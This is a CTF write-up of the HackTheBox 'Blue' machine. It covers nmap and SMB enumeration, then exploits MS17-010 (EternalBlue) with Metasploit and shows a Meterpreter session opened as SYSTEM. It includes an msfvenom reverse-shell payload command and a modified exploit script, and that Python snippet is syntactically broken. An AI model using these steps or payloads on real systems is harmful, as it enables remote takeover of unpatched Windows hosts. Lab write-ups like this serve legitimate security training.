---
title: Blue
date: 2026-03-10
tags: ctf, hackthebox, easy, WanaCry, EternalBlue
excerpt: CVE-2017-0143, The associated ransomware attack, dubbed "WannaCry", is initiated through an SMBv2 remote code execution in Microsoft Windows. This exploit (codenamed "EternalBlue") has been made available on the internet through the Shadowbrokers dump on April 14th, 2017
---

### Nmap

```nix
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49157/tcp open  unknown
```

```nix
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  tcpwrapped
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

=========================================================================
Host script results:
|_clock-skew: mean: -14m20s, deviation: 34m37s, median: 5m38s
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-06-09T13:17:26+01:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2023-06-09T12:17:28
|_  start_date: 2023-06-08T20:17:19
| smb2-security-mode: 
|   210: 
|_    Message signing enabled but not required
```

### Port 135/139/445

```nix
smbclient -L 10.10.10.40 -N

Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	Share           Disk      
	Users           Disk
```

I can try to access the shares or scan for SMB version using `nmap`

```nix
smbclient //10.10.10.40/Users
Password for [WORKGROUP\xi]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Fri Jul 21 09:56:23 2017
  ..                                 DR        0  Fri Jul 21 09:56:23 2017
  Default                           DHR        0  Tue Jul 14 10:07:31 2009
  desktop.ini                       AHS      174  Tue Jul 14 07:54:24 2009
  Public                             DR        0  Tue Apr 12 10:51:29 2011

		4692735 blocks of size 4096. 657677 blocks available
smb: \>
```

After looking around I didn’t find anything useful in the share, onto SMB version scan

```nix
nmap --script "safe or smb-enum-*" -p 445,139,135 -Pn 10.10.10.40

smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_fcrdns: FAIL (No PTR record)
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE: CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|
```

### CVE-2017-0143

The associated ransomware attack, dubbed "WannaCry", is initiated through an SMBv2 remote code execution in Microsoft Windows. This exploit (codenamed "EternalBlue") has been made available on the internet through the Shadowbrokers dump on April 14th, 2017, and patched by Microsoft on March 14.

The  CVE has a Metasploit module 

`exploit/windows/smb/ms17_010_eternalblue`

```nix
msf6 exploit(windows/smb/ms17_010_eternalblue) > run

[*] Started reverse TCP handler on 10.10.14.11:4444 
[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.10.40:445 - The target is vulnerable.
[*] 10.10.10.40:445 - Connecting to target for exploitation.
[+] 10.10.10.40:445 - Connection established for exploitation.
[+] 10.10.10.40:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.10.40:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.10.40:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.10.40:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.10.40:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.10.40:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.10.40:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.10.40:445 - Sending all but last fragment of exploit packet
[*] 10.10.10.40:445 - Starting non-paged pool grooming
[+] 10.10.10.40:445 - Sending SMBv2 buffers
[+] 10.10.10.40:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.10.40:445 - Sending final SMBv2 buffers.
[*] 10.10.10.40:445 - Sending last fragment of exploit packet!
[*] 10.10.10.40:445 - Receiving response from exploit packet
[+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.10.40:445 - Sending egg to corrupted connection.
[*] 10.10.10.40:445 - Triggering free of corrupted buffer.
[*] Sending stage (200774 bytes) to 10.10.10.40
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] Meterpreter session 1 opened (10.10.14.11:4444 -> 10.10.10.40:49158) at 2023-06-09 16:12:28 +0300

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter >
```

### Manual Exploitation

`Exploit:` https://github.com/worawit/MS17-010 

Modifying `zzz_exploit.py` is relatively easy.

Using \ as the username works in this case, as the server is using the default configuration

```nix
'''

USERNAME = '\\'
PASSWORD = ''

'''
```

A slight modification to the smb_pwn method is also required, as by default it only creates a text

file in the root of the drive. Adding the following lines will copy a local binary to the target and

execute it. The binary can be generated by Msfvenom using the command :

`msfvenom -p windows/meterpreter/reverse_tcp lhost=<LAB IP> lport=<PORT> -f exe -o manual.exe`

```python
def smb_pwn(conn, arch):
        smbConn = conn.get_smbconnection()

        print('creating file c:\\pwned.txt on the target')
        tid2 = smbConn.connectTree('C$')
        fid2 = smbConn.createFile(tid2, '/pwned.txt')
        smbConn.closeFile(tid2, fid2)
        smbConn.disconnectTree(tid2)

        #smb_send_file(smbConn, sys.argv[0], 'C', '/exploit.py')
        #service_exec(conn, r'cmd /c copy c:\pwned.txt c:\pwned_exec.txt')
        # Note: there are many methods to get shell over SMB admin session
        # a simple method to get shell (but easily to be detected by AV) is
        # executing binary generated by "msfvenom -f exe-service ..."

def smb_send_file(smbConn, '/home/xi/htb/blue/manual.exe', 'C', '/manual.exe'):
        with open(localSrc, 'rb') as fp:
                smbConn.putFile(remoteDrive + '$', remotePath, fp.read)
```

It’s now possible to run `zzz_exploit.py`